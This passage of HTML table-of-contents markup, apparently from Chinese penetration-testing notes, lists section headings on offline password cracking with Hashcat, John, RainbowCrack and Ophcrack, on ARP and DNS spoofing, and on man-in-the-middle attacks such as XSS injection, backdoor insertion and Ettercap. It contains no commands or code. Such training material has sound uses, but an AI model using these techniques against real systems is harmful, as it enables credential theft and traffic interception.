href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1"><span class="toc-number">22.21.</span> <span class="toc-text">离线密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E5%8A%BF"><span class="toc-number">22.21.1.</span> <span class="toc-text">优势</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E7%A6%BB%E7%BA%BF%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91%E5%AF%86%E7%A0%81%E9%94%81%E5%AE%9A%E6%9C%BA%E5%88%B6"><span class="toc-number">22.21.1.0.1.</span> <span class="toc-text">– 离线不会触发密码锁定机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E4%B8%8D%E4%BC%9A%E4%BA%A7%E7%94%9F%E5%A4%A7%E9%87%8F%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E6%97%A5%E5%BF%97%E5%BC%95%E8%B5%B7%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E6%84%8F"><span class="toc-number">22.21.1.0.2.</span> <span class="toc-text">– 不会产生大量登陆失败日志引起管理员注意</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HASH%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7"><span class="toc-number">22.21.2.</span> <span class="toc-text">HASH识别工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2"><span class="toc-number">22.22.</span> <span class="toc-text">离线密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-HASH%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%85%B7"><span class="toc-number">22.22.1.</span> <span class="toc-text">Windows HASH获取工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-3"><span class="toc-number">22.23.</span> <span class="toc-text">离线密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Syskey%E5%B7%A5%E5%85%B7"><span class="toc-number">22.23.1.</span> <span class="toc-text">Syskey工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94Hashcat"><span class="toc-number">22.24.</span> <span class="toc-text">离线密码破解——Hashcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E6%BA%90%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7"><span class="toc-number">22.24.1.</span> <span class="toc-text">开源多线程密码破解工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%AF%E6%8C%81-80-%E5%A4%9A%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.24.2.</span> <span class="toc-text">支持 80 多种加密算法破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8ECPU%E7%9A%84%E8%AE%A1%E7%AE%97%E8%83%BD%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.24.3.</span> <span class="toc-text">基于CPU的计算能力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E7%A7%8D%E6%A8%A1%E5%BC%8F"><span class="toc-number">22.24.4.</span> <span class="toc-text">六种模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94Hashcat-1"><span class="toc-number">22.25.</span> <span class="toc-text">离线密码破解——Hashcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">22.25.1.</span> <span class="toc-text">命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94oclhashcat"><span class="toc-number">22.26.</span> <span class="toc-text">离线密码破解——oclhashcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%B7%E7%A7%B0%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%BF%AB%E3%80%81%E5%94%AF%E4%B8%80%E7%9A%84%E5%9F%BA%E4%BA%8EGPGPU%E7%9A%84%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E8%BD%AF%E4%BB%B6"><span class="toc-number">22.26.1.</span> <span class="toc-text">号称世界上最快、唯一的基于GPGPU的密码破解软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E8%B4%B9%E5%BC%80%E6%BA%90%E3%80%81%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B9%B3%E5%8F%B0%E3%80%81%E6%94%AF%E6%8C%81%E5%88%86%E5%B8%83%E5%BC%8F%E3%80%81150-hash%E7%AE%97%E6%B3%95"><span class="toc-number">22.26.2.</span> <span class="toc-text">免费开源、支持多平台、支持分布式、150+hash算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E6%94%AF%E6%8C%81"><span class="toc-number">22.26.3.</span> <span class="toc-text">硬件支持</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8"><span class="toc-number">22.26.3.0.1.</span> <span class="toc-text">– 虚拟机中无法使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">22.26.4.</span> <span class="toc-text">限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%9C%80%E5%A4%A7%E5%AF%86%E7%A0%81%E9%95%BF%E5%BA%A6-55-%E5%AD%97%E7%AC%A6"><span class="toc-number">22.26.4.0.1.</span> <span class="toc-text">– 最大密码长度 55 字符</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94oclhashcat-1"><span class="toc-number">22.27.</span> <span class="toc-text">离线密码破解——oclhashcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC"><span class="toc-number">22.27.1.</span> <span class="toc-text">关于版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4-1"><span class="toc-number">22.27.2.</span> <span class="toc-text">命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94RainbowCrack"><span class="toc-number">22.28.</span> <span class="toc-text">离线密码破解——RainbowCrack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E8%AE%B0%E5%BF%86%E6%9D%83%E8%A1%A1%E6%8A%80%E6%9C%AF%E7%94%9F%E6%88%90%E5%BD%A9%E8%99%B9%E8%A1%A8"><span class="toc-number">22.28.1.</span> <span class="toc-text">基于时间记忆权衡技术生成彩虹表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%89%8D%E8%AE%A1%E7%AE%97%E5%AF%86%E7%A0%81%E7%9A%84HASH%E5%80%BC%EF%BC%8C%E9%80%9A%E8%BF%87%E6%AF%94%E5%AF%B9HASH%E5%80%BC%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">22.28.2.</span> <span class="toc-text">提前计算密码的HASH值，通过比对HASH值破解密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97HASH%E7%9A%84%E9%80%9F%E5%BA%A6%E5%BE%88%E6%85%A2%EF%BC%8C%E4%BF%AE%E6%94%B9%E7%89%88%E6%94%AF%E6%8C%81CUDA-GPU"><span class="toc-number">22.28.3.</span> <span class="toc-text">计算HASH的速度很慢，修改版支持CUDA GPU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KALI-%E4%B8%AD%E5%8C%85%E5%90%AB%E7%9A%84RainbowCrack%E5%B7%A5%E5%85%B7"><span class="toc-number">22.28.4.</span> <span class="toc-text">KALI 中包含的RainbowCrack工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94RainbowCrack-1"><span class="toc-number">22.29.</span> <span class="toc-text">离线密码破解——RainbowCrack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A9%E8%99%B9%E8%A1%A8"><span class="toc-number">22.29.1.</span> <span class="toc-text">彩虹表</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%E3%80%81HASH%E5%80%BC%E3%80%81HASH%E7%AE%97%E6%B3%95%E3%80%81%E5%AD%97%E7%AC%A6%E9%9B%86%E3%80%81%E6%98%8E%E6%96%87%E9%95%BF%E5%BA%A6%E8%8C%83%E5%9B%B4"><span class="toc-number">22.29.1.0.1.</span> <span class="toc-text">– 密码明文、HASH值、HASH算法、字符集、明文长度范围</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rtgen"><span class="toc-number">22.29.2.</span> <span class="toc-text">rtgen</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%BD%A9%E8%99%B9%E8%A1%A8"><span class="toc-number">22.29.3.</span> <span class="toc-text">下载彩虹表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94RainbowCrack-2"><span class="toc-number">22.30.</span> <span class="toc-text">离线密码破解——RainbowCrack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A9%E8%99%B9%E8%A1%A8%E6%8E%92%E5%BA%8F"><span class="toc-number">22.30.1.</span> <span class="toc-text">彩虹表排序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.30.2.</span> <span class="toc-text">密码破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94John"><span class="toc-number">22.31.</span> <span class="toc-text">离线密码破解——John</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E4%BC%97%E5%A4%9A%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8%E7%9A%84%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.31.1.</span> <span class="toc-text">支持众多服务应用的加密破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E6%9F%90%E4%BA%9B%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.31.2.</span> <span class="toc-text">支持某些对称加密算法破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F"><span class="toc-number">22.31.3.</span> <span class="toc-text">模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94John-1"><span class="toc-number">22.32.</span> <span class="toc-text">离线密码破解——John</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E7%A0%B4%E8%A7%A3%E6%A8%A1%E5%BC%8F"><span class="toc-number">22.32.1.</span> <span class="toc-text">默认破解模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3Linux%E7%B3%BB%E7%BB%9F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">22.32.2.</span> <span class="toc-text">破解Linux系统账号密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94John-2"><span class="toc-number">22.33.</span> <span class="toc-text">离线密码破解——John</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3windows%E5%AF%86%E7%A0%81-1"><span class="toc-number">22.33.1.</span> <span class="toc-text">破解windows密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Johnny-%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%E7%9A%84john"><span class="toc-number">22.33.2.</span> <span class="toc-text">Johnny 图形化界面的john</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94Ophcrack"><span class="toc-number">22.34.</span> <span class="toc-text">离线密码破解——Ophcrack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%BD%A9%E8%99%B9%E8%A1%A8%E7%9A%84LM%E3%80%81NTLM%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E8%BD%AF%E4%BB%B6"><span class="toc-number">22.34.1.</span> <span class="toc-text">基于彩虹表的LM、NTLM密码破解软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A9%E8%99%B9%E8%A1%A8%EF%BC%9Ahttp-ophcrack-sourceforge-net-tables-php"><span class="toc-number">22.34.2.</span> <span class="toc-text">彩虹表：http:&#x2F;&#x2F;ophcrack.sourceforge.net&#x2F;tables.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94Ophcrack-1"><span class="toc-number">22.35.</span> <span class="toc-text">离线密码破解——Ophcrack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.35.1.</span> <span class="toc-text">在线密码破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2"><span class="toc-number">22.36.</span> <span class="toc-text">密码嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%B8%89%E5%B1%82%E5%9C%B0%E5%9D%80"><span class="toc-number">22.36.1.</span> <span class="toc-text">二、三层地址</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-IP-%E7%BD%91%E7%BB%9C%E5%88%B0%E7%BD%91%E7%BB%9C"><span class="toc-number">22.36.1.0.1.</span> <span class="toc-text">– IP 网络到网络</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-MAC-%E4%B8%BB%E6%9C%BA%E5%88%B0%E4%B8%BB%E6%9C%BA"><span class="toc-number">22.36.1.0.2.</span> <span class="toc-text">– MAC 主机到主机</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E6%8D%A2%E6%9C%BA%E4%B8%8EHUB"><span class="toc-number">22.36.2.</span> <span class="toc-text">交换机与HUB</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-HUB%E5%85%A8%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">22.36.2.0.1.</span> <span class="toc-text">– HUB全端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E6%A0%B9%E6%8D%AE%E5%AD%A6%E4%B9%A0%E5%9C%B0%E5%9D%80%E8%BD%AC%E5%8F%91"><span class="toc-number">22.36.2.0.2.</span> <span class="toc-text">– 交换机根据学习地址转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F%E6%8A%93%E5%8C%85"><span class="toc-number">22.36.2.0.3.</span> <span class="toc-text">– 混杂模式抓包</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2-1"><span class="toc-number">22.37.</span> <span class="toc-text">密码嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP%E5%8D%8F%E8%AE%AE"><span class="toc-number">22.37.1.</span> <span class="toc-text">ARP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%85%8D%E8%B4%B9ARP"><span class="toc-number">22.37.1.0.1.</span> <span class="toc-text">– 免费ARP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%9F%BA%E4%BA%8E%E5%B9%BF%E6%92%AD%E5%AD%A6%E4%B9%A0"><span class="toc-number">22.37.1.0.2.</span> <span class="toc-text">– 基于广播学习</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%A4%B4%E3%80%81ARP%E5%A4%B4"><span class="toc-number">22.37.1.0.3.</span> <span class="toc-text">– 以太网头、ARP头</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E8%AF%B7%E6%B1%82%E3%80%81%E5%93%8D%E5%BA%94%E7%9B%B8%E5%AF%B9%E7%8B%AC%E7%AB%8B"><span class="toc-number">22.37.1.0.4.</span> <span class="toc-text">– 请求、响应相对独立</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%9F%BA%E4%BA%8E%E4%BC%A0%E9%97%BB%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-number">22.37.1.0.5.</span> <span class="toc-text">– 基于传闻的协议</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2-2"><span class="toc-number">22.38.</span> <span class="toc-text">密码嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97"><span class="toc-number">22.38.1.</span> <span class="toc-text">手动修改数据包实现ARP欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arpspoof"><span class="toc-number">22.38.2.</span> <span class="toc-text">arpspoof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2"><span class="toc-number">22.38.3.</span> <span class="toc-text">网络嗅探</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2-3"><span class="toc-number">22.39.</span> <span class="toc-text">密码嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E6%AC%BA%E9%AA%97%E4%BB%A3%E7%90%86"><span class="toc-number">22.39.1.</span> <span class="toc-text">DNS欺骗代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E8%A2%AB%E5%AE%B3%E8%80%85DNS%E6%8C%87%E5%90%91%E4%BC%AA%E9%80%A0%E7%9A%84DNS%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">22.39.2.</span> <span class="toc-text">将被害者DNS指向伪造的DNS服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">22.40.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5XSS"><span class="toc-number">22.40.0.1.</span> <span class="toc-text">注入XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mitmf-%E5%AE%89%E8%A3%85"><span class="toc-number">22.40.0.2.</span> <span class="toc-text">Mitmf 安装</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-1"><span class="toc-number">22.41.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8beef"><span class="toc-number">22.41.1.</span> <span class="toc-text">启动beef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mitmf%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%B3%A8%E5%85%A5xss%E8%84%9A%E6%9C%AC"><span class="toc-number">22.41.2.</span> <span class="toc-text">mitmf中间人注入xss脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-2"><span class="toc-number">22.42.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93hsts"><span class="toc-number">22.42.1.</span> <span class="toc-text">–hsts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93filepwn"><span class="toc-number">22.42.2.</span> <span class="toc-text">–filepwn</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%87%8C%E7%A9%BA%E6%8F%92%E5%90%8E%E9%97%A8"><span class="toc-number">22.42.2.0.1.</span> <span class="toc-text">– 凌空插后门</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-3"><span class="toc-number">22.43.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ettercap"><span class="toc-number">22.43.1.</span> <span class="toc-text">Ettercap</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E7%BB%9F%E4%B8%80%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7"><span class="toc-number">22.43.1.0.1.</span> <span class="toc-text">– 统一的中间人攻击工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E8%BD%AC%E5%8F%91MAC%E4%B8%8E%E6%9C%AC%E6%9C%BA%E7%9B%B8%E5%90%8C%EF%BC%8C%E4%BD%86IP%E4%B8%8E%E6%9C%AC%E6%9C%BA%E4%B8%8D%E5%90%8C%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">22.43.1.0.2.</span> <span class="toc-text">– 转发MAC与本机相同，但IP与本机不同的数据包</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%94%AF%E6%8C%81SSH1%E3%80%81SSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">22.43.1.0.3.</span> <span class="toc-text">– 支持SSH1、SSL中间人攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%88%92%E5%88%86"><span class="toc-number">22.43.2.</span> <span class="toc-text">模块划分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-4"><span class="toc-number">22.44.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Snifer"><span class="toc-number">22.44.1.</span> <span class="toc-text">Snifer</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E8%B4%9F%E8%B4%A3%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BD%AC%E5%8F%91"><span class="toc-number">22.44.1.0.1.</span> <span class="toc-text">– 负责数据包转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MITM"><span class="toc-number">22.44.2.</span> <span class="toc-text">MITM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-5"><span class="toc-number">22.45.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0MITM%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">22.45.1.</span> <span class="toc-text">实现MITM的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-ARP"><span class="toc-number">22.45.1.0.1.</span> <span class="toc-text">– ARP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-ICMP"><span class="toc-number">22.45.1.0.2.</span> <span class="toc-text">– ICMP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-6"><span class="toc-number">22.46.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4%E4%BB%A5%E4%B8%8A%E5%86%85%E6%A0%B8%E5%AF%B9ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E7%9A%84%E7%BA%A6%E6%9D%9F"><span class="toc-number">22.46.1.</span> <span class="toc-text">2.4以上内核对ARP地址欺骗的约束</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%94%B6%E5%88%B0%E9%9D%9E%E8%AF%B7%E6%B1%82%E7%9A%84ARP%E5%93%8D%E5%BA%94%E5%8C%85%EF%BC%8C%E4%B8%8D%E6%9B%B4%E6%96%B0%E6%9C%AC%E5%9C%B0ARP%E7%BC%93%E5%AD%98"><span class="toc-number">22.46.1.0.1.</span> <span class="toc-text">– 收到非请求的ARP响应包，不更新本地ARP缓存</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solaris-%E4%B8%8D%E6%A0%B9%E6%8D%AEARP%E5%8C%85%E6%9B%B4%E6%96%B0%E6%9C%AC%E5%9C%B0ARP%E7%BC%93%E5%AD%98"><span class="toc-number">22.46.2.</span> <span class="toc-text">Solaris 不根据ARP包更新本地ARP缓存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-7"><span class="toc-number">22.47.</span> <span class="toc-text">中间人攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%93%8D%E4%BD%9C%E7%95%8C%E9%9D%A2"><span class="toc-number">22.47.1.</span> <span class="toc-text">用户操作界面</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-T-%E6%96%87%E6%9C%AC%E7%95%8C%E9%9D%A2"><span class="toc-number">22.47.1.0.1.</span> <span class="toc-text">– -T 文本界面</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-G-%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2"><span class="toc-number">22.47.1.0.2.</span> <span class="toc-text">– -G 图形界面</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-C-%E5%9F%BA%E4%BA%8E%E6%96%87%E6%9C%AC%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2"><span class="toc-number">22.47.1.0.3.</span> <span class="toc-text">– -C 基于文本的图形界面</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 